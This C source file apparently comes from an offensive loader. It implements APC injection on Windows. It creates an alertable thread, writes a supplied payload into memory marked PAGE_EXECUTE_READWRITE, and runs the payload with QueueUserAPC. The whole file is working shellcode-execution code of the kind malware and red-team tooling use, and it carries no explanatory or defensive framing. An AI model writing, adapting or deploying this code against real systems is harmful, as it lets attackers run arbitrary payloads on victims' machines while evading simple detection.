#include "injection.h"

VOID AlertableFunction() {
    HANDLE hEvent1 = CreateEvent(NULL, FALSE, FALSE, NULL);
    HANDLE hEvent2 = CreateEvent(NULL, FALSE, FALSE, NULL);

    if (hEvent1 && hEvent2) {
        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
    }

    // Ensure the thread remains alertable for APC execution
    while (TRUE) {
        SleepEx(INFINITE, TRUE);  // Forces execution of queued APCs
    }

    if (hEvent1) CloseHandle(hEvent1);
    if (hEvent2) CloseHandle(hEvent2);
}


static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;
    DWORD dwOldProtection = 0;

    // Allocate memory for payload
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        DebugPrint("\t[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    // Copy payload to allocated memory
    memcpy(pAddress, pPayload, sPayloadSize);

    DebugPrint("\t[i] Payload Written To: 0x%p \n", pAddress);

    // Change memory protection to executable
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        DebugPrint("\t[!] VirtualProtect Failed With Error: %d \n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Queue the APC payload
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        DebugPrint("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    SleepEx(10, FALSE);

    return TRUE;
}

BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
    DWORD dwThreadId = NULL;

    hThread = CreateThread(NULL, 0, &AlertableFunction, NULL, 0, &dwThreadId);
    if (hThread == NULL) {
        DebugPrint("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    DebugPrint("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
    DebugPrint("[i] Running Apc Injection Function ... \n");

    if (!RunViaApcInjection(hThread, pPayload, sPayloadSize)) {
        CloseHandle(hThread);
        return FALSE;
    }

    CloseHandle(hThread);

    DebugPrint("[+] APC Injection Successful \n");

    return TRUE;
}
